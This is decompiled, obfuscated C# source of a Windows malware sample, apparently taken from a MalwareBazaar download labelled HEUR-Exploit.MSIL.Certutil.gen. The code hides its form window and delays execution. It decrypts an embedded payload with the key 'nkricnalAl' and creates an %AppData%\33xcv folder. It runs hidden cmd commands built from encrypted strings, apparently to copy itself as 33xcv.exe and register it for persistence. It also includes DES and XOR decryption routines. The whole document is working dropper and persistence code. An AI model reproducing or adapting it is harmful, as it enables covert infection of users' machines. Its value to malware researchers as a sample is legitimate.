// Decompiled with JetBrains decompiler
// Type: ComVisibleAttribute
// Assembly: nkricnalAl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F238D28-5A10-4BC1-8318-2ABF5F2B8ACE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Exploit.MSIL.Certutil.gen-800f0b3cb78a8f0934c09d710a8e42286275cbaa10dbdb1841669f6280f0ab51.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class ComVisibleAttribute : Form
{
  private const int Instructions = 256;
  private const int OpenMethod = 1000;

  private void LastIndexOf()
  {
    \u003CModule\u003E.\u002Es\u00A5F\u0083((object) this);
    \u003CModule\u003E.äæÉJÊ((object) this, FormBorderStyle.None);
    \u003CModule\u003E.GA\u00B0\u00A28((object) this, false);
    \u003CModule\u003E.\u0082I_\u0021\u00A7((object) this, false);
    \u003CModule\u003E.ÞìaÂY((object) this, false);
    \u003CModule\u003E.ã\u003A\u00AD\u0097\u008A((object) this, FormWindowState.Minimized);
  }

  public ComVisibleAttribute()
  {
    \u003CModule\u003E.\u00AC\u001CòX\u009B((object) this);
    string str1 = \u003CModule\u003E.s\u000F\u001CS3();
    string str2 = "managed";
    \u003CModule\u003E.\u00AB\u00A4l\u0089\u0012(5000);
    byte[] numArray1 = (byte[]) null;
    if (!\u003CModule\u003E.\u009A\u005B\u003C\u00D7u(str2, "native"))
      numArray1 = \u003CModule\u003E.\u0097\u00287\u007BÊ("nkricnalAl", "nkricnalAl");
    byte[] numArray2 = \u003CModule\u003E.\u0014\u00AF5\u0086F((object) this, numArray1, "nkricnalAl");
    int num1 = \u003CModule\u003E.\u00F7\u005Bû\u002FÁ(str1, (string) null, numArray2, false) ? 1 : 0;
    string str3 = \u003CModule\u003E.\u0033\u00BB\u00A5ój(\u003CModule\u003E.\u0087ÔQÞ\u00A7(Environment.SpecialFolder.ApplicationData), "\\");
    int num2 = \u003CModule\u003E.Ò\u00B9\u000B\u00AF\u002C(\u003CModule\u003E.\u0033\u00BB\u00A5ój(\u003CModule\u003E.\u00A59Ì\u0006Ç(\u003CModule\u003E.s\u000F\u001CS3()), "\\"), \u003CModule\u003E.\u0033\u00BB\u00A5ój(\u003CModule\u003E.\u0087ÔQÞ\u00A7(Environment.SpecialFolder.ApplicationData), "\\")) ? 1 : 0;
    string str4 = \u003CModule\u003E.M\u00AE\u003F\u0012\u00BF((object) this, \u003CModule\u003E.ÿÂ\u0014ÚÑ("mkdir \"", str3, "33xcv\""));
    string str5 = \u003CModule\u003E.M\u00AE\u003F\u0012\u00BF((object) this, \u003CModule\u003E.ÿÂ\u0014ÚÑ(\u003CModule\u003E.î\u00A2Ô\u000BÞ("Wx5VEu9AM8PG1+DzTdYvIboqclHo62WCOs4SRVG/5hVYt7UgB6QPjSiLfJ0mo6KzMrUgDJ11Yz0=", "nkricnalAl"), str3, "33xcv\\33xcv.exe'\" /f"));
    LoadAllTables m = \u003CModule\u003E.M\u00AE\u003F\u0012\u00BF;
    string[] strArray = new string[5]
    {
      \u003CModule\u003E.î\u00A2Ô\u000BÞ("rLBX8hykCa0=", "nkricnalAl"),
      \u003CModule\u003E.s\u000F\u001CS3(),
      "\" \"",
      str3,
      "33xcv\\33xcv.exe\""
    };
    string str6 = \u003CModule\u003E.ý\u0010O\u00A4\u0017(strArray);
    string str7 = m((object) this, str6);
    if (true)
      return;
    ProcessStartInfo processStartInfo = (ProcessStartInfo) \u003CModule\u003E.\u00A5\u0086\u001DwË("rwerwer", "/rwere ");
    \u003CModule\u003E.ØwgË\u0090((object) processStartInfo, ProcessWindowStyle.Hidden);
    string str8 = \u003CModule\u003E.\u0025\u009Ct\u007B\u0006();
    \u003CModule\u003E.r\u003BW\u0023í(\u003CModule\u003E.\u0033\u00BB\u00A5ój("Command Line: \n", str8));
    object obj = \u003CModule\u003E.Så\u0085\u009D\u00B6("#bindpath#\\#bindname#");
  }

  private string Get_Owner(string _param1)
  {
    ProcessStartInfo processStartInfo = (ProcessStartInfo) \u003CModule\u003E.\u00A5\u0086\u001DwË("cmd", \u003CModule\u003E.\u0033\u00BB\u00A5ój("/c ", _param1));
    \u003CModule\u003E.\u00BB\u001A\u000B\u005Bp((object) processStartInfo, true);
    \u003CModule\u003E.\u000C\u001D7\u0027ß((object) processStartInfo, false);
    \u003CModule\u003E.ÌÐ\u00A1Év((object) processStartInfo, true);
    Process process = (Process) \u003CModule\u003E.\u00A2\u000E\u0027XM();
    \u003CModule\u003E.\u0084vÞ\u00B0\u00B7((object) process, (object) processStartInfo);
    int num = \u003CModule\u003E.J\u0020\u00A8ýE((object) process) ? 1 : 0;
    return (string) null;
  }

  public static string EndIndex(string _param0, string _param1)
  {
    try
    {
      string str1 = nameof ();
      string str2 = "12345678";
      byte[] numArray1 = new byte[0];
      byte[] numArray2 = \u003CModule\u003E.Á\u0040\u0086_1(\u003CModule\u003E.\u00B2\u000BÇ\u005C\u00A6(), _param1);
      byte[] numArray3 = new byte[0];
      byte[] numArray4 = \u003CModule\u003E.Á\u0040\u0086_1(\u003CModule\u003E.\u00B2\u000BÇ\u005C\u00A6(), str2);
      byte[] numArray5 = new byte[\u003CModule\u003E.SÓ\u009F\u0015Ã((object) \u003CModule\u003E.\u002Fae\u00B2Ó((object) _param0, " ", "+"))];
      byte[] numArray6 = \u003CModule\u003E.k\u0023\u00A2\u0012ë(\u003CModule\u003E.\u002Fae\u00B2Ó((object) _param0, " ", "+"));
      DESCryptoServiceProvider cryptoServiceProvider = (DESCryptoServiceProvider) \u003CModule\u003E.\u00AEÜT\u0014\u008D();
      try
      {
        MemoryStream memoryStream = (MemoryStream) \u003CModule\u003E.\u002Fj\u009B\u0017\u00A8();
        CryptoStream cryptoStream = (CryptoStream) \u003CModule\u003E.\u0081\u00226ò\u0082((object) memoryStream, \u003CModule\u003E.ÿ\u00B3\u000E`\u0004((object) cryptoServiceProvider, numArray4, numArray2), CryptoStreamMode.Write);
        \u003CModule\u003E.\u0018\u00B7ñªº((object) cryptoStream, numArray6, 0, numArray6.Length);
        \u003CModule\u003E.ÜÂÍ\u00B28((object) cryptoStream);
        Encoding encoding = (Encoding) \u003CModule\u003E.\u00B2\u000BÇ\u005C\u00A6();
        str1 = \u003CModule\u003E.\u0095ã\u008EDn((object) encoding, \u003CModule\u003E.ôX\u00B8i\u0007((object) memoryStream));
      }
      finally
      {
        if (cryptoServiceProvider != null)
          \u003CModule\u003E.\u008C\u00BF\u00A8þè((object) cryptoServiceProvider);
      }
      return str1;
    }
    catch (Exception ex)
    {
      throw \u003CModule\u003E.îO3\u0023\u0006(\u003CModule\u003E.S\u00BCôüa((object) ex), \u003CModule\u003E.\u006023\u005D\u001A((object) ex));
    }
  }

  public byte[] TimerHolder(byte[] _param1, string _param2)
  {
    uint num = 0;
    byte[] numArray = \u003CModule\u003E.Á\u0040\u0086_1(\u003CModule\u003E.\u00B2\u000BÇ\u005C\u00A6(), _param2);
    for (int index = 0; (long) index <= (long) (_param1.Length - 1) * (long) (num + 1U); ++index)
      _param1[index % _param1.Length] = (byte) ((\u003CModule\u003E.\u008B7MU\u009A((int) _param1[index % _param1.Length] ^ (int) numArray[index % numArray.Length]) - (int) _param1[(index + 3 - 2) % _param1.Length] + (int) byte.MaxValue + 1) % 256);
    Array.Resize<byte>(ref _param1, _param1.Length - 1);
    return _param1;
  }
}
